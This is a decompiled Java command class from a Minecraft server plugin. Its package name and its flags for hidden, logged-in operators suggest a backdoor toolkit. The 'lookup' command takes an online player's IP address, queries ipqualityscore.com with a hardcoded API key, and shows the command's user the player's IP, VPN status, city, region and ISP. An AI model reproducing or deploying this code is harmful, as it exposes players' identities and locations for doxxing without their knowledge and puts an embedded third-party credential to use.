/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.json.JSONObject
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.json.JSONObject;

public class LookupCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("lookup <player>"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else if (plugin.lite.contains(target.getName())) {
                p2.sendMessage(Settings.PREFIX("You cannot lookup players logged in!"));
            } else {
                String vpn = "false";
                String region = "Unknown";
                String city = "Unknown";
                String isp = "Unknown";
                try {
                    String inputLine;
                    URL vpncheck = new URL("https://www.ipqualityscore.com/api/json/ip/UCNKI16V5h8Bum2rmHHFKTjZDTBzqff8/" + API.getIPOfPlayer(target));
                    HttpURLConnection con = (HttpURLConnection)vpncheck.openConnection();
                    BufferedReader in2 = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    StringBuffer response = new StringBuffer();
                    while ((inputLine = in2.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in2.close();
                    JSONObject myresponse = new JSONObject(response.toString());
                    if (myresponse.has("proxy")) {
                        if (myresponse.getBoolean("proxy")) {
                            vpn = "true";
                        } else if (myresponse.has("vpn") && myresponse.getBoolean("vpn")) {
                            vpn = "true";
                        }
                    }
                    if (myresponse.has("city")) {
                        city = myresponse.getString("city");
                    }
                    if (myresponse.has("region")) {
                        region = myresponse.getString("region");
                    }
                    if (myresponse.has("ISP")) {
                        isp = myresponse.getString("ISP");
                    }
                }
                catch (IOException iOException) {
                    // empty catch block
                }
                p2.sendMessage("§8§m----------------------------------");
                p2.sendMessage("         §4" + Settings.NAME + " lookup on " + target.getName());
                p2.sendMessage("");
                p2.sendMessage(Settings.DARK_RED + "IP Address: " + Settings.WHITE + API.getIPOfPlayer(target));
                p2.sendMessage(Settings.DARK_RED + "On VPN?: " + Settings.WHITE + vpn);
                p2.sendMessage(Settings.DARK_RED + "Region: " + Settings.WHITE + region);
                p2.sendMessage(Settings.DARK_RED + "City: " + Settings.WHITE + city);
                p2.sendMessage(Settings.DARK_RED + "ISP: " + Settings.WHITE + isp);
                p2.sendMessage("");
                p2.sendMessage("§8§m----------------------------------");
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

